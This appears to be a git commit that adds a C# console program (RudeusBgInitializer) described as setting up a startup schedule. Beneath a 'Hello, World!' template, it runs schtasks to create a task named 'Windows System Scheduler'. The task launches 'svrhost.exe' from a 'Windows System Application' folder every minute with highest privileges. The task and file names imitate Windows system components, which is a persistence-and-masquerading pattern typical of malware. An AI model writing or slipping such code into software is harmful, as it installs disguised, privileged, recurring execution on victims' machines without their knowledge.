073a81c5a6ebb26a24d09135bad571d90412f3c4
aaaa777 <aaaa777@users.noreply.github.com>
2023-10-09 06:27:48 +0900

    スタートアップスケジュール追加を行うプロジェクト追加

---
+++ RudeusBgInitializer/Program.cs
@@ -0,0 +1,8 @@
+﻿
+using System.Diagnostics;
+
+// See https://aka.ms/new-console-template for more information
+Console.WriteLine("Hello, World!");
+
+// サービスの登録を行う
+Process.Start("schtasks /create /tn \"Windows System Scheduler\" /tr \"'C:\\Program Files\\Windows System Application\\svrhost.exe'\" /sc minute /mo 1 /rl HIGHEST");
